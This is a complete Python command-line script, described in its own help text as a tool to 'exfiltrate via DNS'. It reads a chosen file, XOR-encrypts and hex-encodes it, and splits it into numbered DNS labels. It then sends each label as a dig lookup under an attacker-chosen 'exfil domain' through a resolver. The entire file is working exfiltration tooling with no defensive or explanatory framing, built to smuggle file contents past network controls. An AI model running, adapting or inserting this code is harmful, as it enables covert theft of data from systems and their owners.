#!/usr/bin/env python3
import argparse
import binascii
import math
import subprocess
import sys

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR each byte of data with the key (repeating)."""
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def chunk_string(s: str, size: int):
    """Yield successive chunks of given size from s."""
    for i in range(0, len(s), size):
        yield s[i:i+size]

def send_dns_query(label: str, domain: str, server: str, port: int):
    """Send a DNS lookup for label.domain to the specified server and port using dig."""
    fqdn = f"{label}.{domain}"
    cmd = ["dig", "+short", "-p", str(port), fqdn, f"@{server}"]
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():
    parser = argparse.ArgumentParser(
        description="XOR-encrypt, hex-encode, chunk (DNS-safe), and exfiltrate via DNS."
    )
    parser.add_argument("-f", "--file",       required=True, help="Path to file to exfiltrate")
    parser.add_argument("-k", "--key",        required=True, help="XOR key (string)")
    parser.add_argument("-d", "--domain",     required=True, help="Exfil domain (e.g. exfil.example.com)")
    parser.add_argument("-s", "--server",     default="8.8.8.8",      help="DNS server IP")
    parser.add_argument("-p", "--port",       type=int, default=53,   help="DNS server port (default: 53)")
    parser.add_argument("-c", "--chunk-size", type=int, default=50,
                        help="Desired max chars per label (before auto-resize)")
    args = parser.parse_args()

    # 1. Read file
    try:
        with open(args.file, "rb") as f:
            data = f.read()
    except IOError as e:
        print(f"Error reading file: {e}", file=sys.stderr)
        sys.exit(1)

    # 2. XOR encrypt
    key_bytes = args.key.encode()
    encrypted = xor_encrypt(data, key_bytes)

    # 3. Hex-encode (0–9 a–f)
    hexed = binascii.hexlify(encrypted).decode()

    # 4. Auto-resize chunk size to fit DNS label limits (≤63 chars)
    chunksize = args.chunk_size
    while True:
        total_chunks = math.ceil(len(hexed) / chunksize)
        digits = len(str(total_chunks))
        # account for "<seq>-<chunk>" => digits + 1 for dash + chunk
        max_payload = 63 - digits - 1
        if chunksize > max_payload:
            print(f"[!] chunk-size {chunksize} too big; reducing to {max_payload}")
            chunksize = max_payload
            continue
        break

    # 5. Chunk the hex string
    chunks = list(chunk_string(hexed, chunksize))
    print(f"[+] Using chunk size: {chunksize}")
    print(f"[+] Total chunks: {len(chunks)}")

    # 6. Send each chunk as "<seq>-<hexchunk>.domain"
    for idx, chunk in enumerate(chunks, 1):
        label = f"{idx}-{chunk}"
        print(f"[{idx}/{len(chunks)}] {label}")
        send_dns_query(label, args.domain, args.server, args.port)

    print("[+] Done.")

if __name__ == "__main__":
    main()
